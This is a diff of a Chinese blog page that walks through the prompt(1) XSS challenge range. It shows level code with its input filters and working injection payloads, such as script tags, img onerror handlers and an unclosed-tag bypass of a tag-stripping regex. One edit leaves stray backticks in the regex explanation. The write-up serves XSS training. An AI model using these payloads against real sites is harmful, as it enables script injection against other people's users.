@@ -23,7 +23,7 @@
 <meta property="og:site_name" content="IT技术学习分享自留地">
 <meta property="og:description" content="一、概述prompt(1) to win是一个XSS挑战的靶场。 靶场地址：http://prompt.ml/0 目标：Payload不需要用户交互，当输入有效且能执行prompt(1)向量时，会自动提交用户的答案。并显示YOU WON字样。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-03-11T09:25:16.297Z">
+<meta property="og:updated_time" content="2019-03-12T00:59:29.699Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Chapter 3：XSS学习系列之prompt(1) XSS挑战">
 <meta name="twitter:description" content="一、概述prompt(1) to win是一个XSS挑战的靶场。 靶场地址：http://prompt.ml/0 目标：Payload不需要用户交互，当输入有效且能执行prompt(1)向量时，会自动提交用户的答案。并显示YOU WON字样。">
@@ -314,34 +314,24 @@
 <p>没有经过任何过滤就直接输出，直接考虑闭合即可。</p>
 <p>Payload:</p>
 <blockquote>
-<ul>
-<li><p><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>
-</li>
-<li><p><code>&quot;&gt;&lt;img src=x onerror=prompt(1)&gt;</code></p>
-</li>
-</ul>
+<p><code>&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>
+<p><code>&quot;&gt;&lt;img src=x onerror=prompt(1)&gt;</code></p>
 </blockquote>
 <h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // tags stripping mechanism from ExtJS library</span><br><span class="line">    // Ext.util.Format.stripTags</span><br><span class="line">    var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;</span><br><span class="line">    input = input.replace(stripTagsRE, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    return &apos;&lt;article&gt;&apos; + input + &apos;&lt;/article&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>JS正则：</p>
 <ul>
-<li><p>语法规则：<code>/正则表达式主体/修饰符(可选)</code></p>
-</li>
-<li><p><code>/&lt;\/?[^&gt;]+&gt;/gi</code>：</p>
-<ul>
-<li>匹配<code>&lt;除&gt;以外任意&gt;</code>或<code>&lt;/除&gt;以外任意&gt;</code></li>
-<li><code>/gi</code>标识全局搜索匹配、不区分大小写。</li>
+<li>语法规则：<code>/正则表达式主体/修饰符(可选)`</code></li>
+<li><code></code>/&lt;\/?[^&gt;]+&gt;/gi`：<ul>
+<li>匹配<code>&lt;除&gt;以外任意&gt;</code>或<code>&lt;/除&gt;以外任意&gt;`</code></li>
+<li><code></code>/gi`标识全局搜索匹配、不区分大小写。</li>
 </ul>
 </li>
 </ul>
 <p>将匹配的替换为空，因此不能出现<code>&lt;</code>和<code>&gt;</code>不能同时出现。由于一个标签即使没有最后面的<code>&gt;</code>也是可以被浏览器正确解析的。或者最后使用<code>//</code></p>
 <p>因此，Payload:</p>
 <blockquote>
-<ul>
-<li><p><code>&lt;img src=x onerror=prompt(1) //</code></p>
-</li>
-<li><p><code>&lt;img src=x onerror=prompt(1)(空格)</code></p>
-</li>
-</ul>
+<p><code>&lt;img src=x onerror=prompt(1) //</code></p>
+<p><code>&lt;img src=x onerror=prompt(1)(空格)</code></p>
 </blockquote>
 <h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // v-- frowny face</span><br><span class="line">    input = input.replace(/[=(]/g, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    // ok seriously, disallows equal signs and open parenthesis</span><br><span class="line">    return input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>[=(]</code>该正则含义为匹配<code>=</code>或<code>(</code>，因此这两个会被过滤。</p>
@@ -418,7 +408,7 @@
         <p><span>本文标题:</span><a href="/2019/03/11/0x02-XSS学习系列之练习靶场01/">Chapter 3：XSS学习系列之prompt(1) XSS挑战</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">sh4douu</a></p>
         <p><span>发布时间:</span>2019-03-11, 14:18:29</p>
-        <p><span>最后更新:</span>2019-03-11, 17:25:16</p>
+        <p><span>最后更新:</span>2019-03-12, 08:59:29</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/03/11/0x02-XSS学习系列之练习靶场01/" title="Chapter 3：XSS学习系列之prompt(1) XSS挑战">https://sakuxa.com/2019/03/11/0x02-XSS学习系列之练习靶场01/</a>
             <span class="copy-path" data-clipboard-text="原文: https://sakuxa.com/2019/03/11/0x02-XSS学习系列之练习靶场01/　　作者: sh4douu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
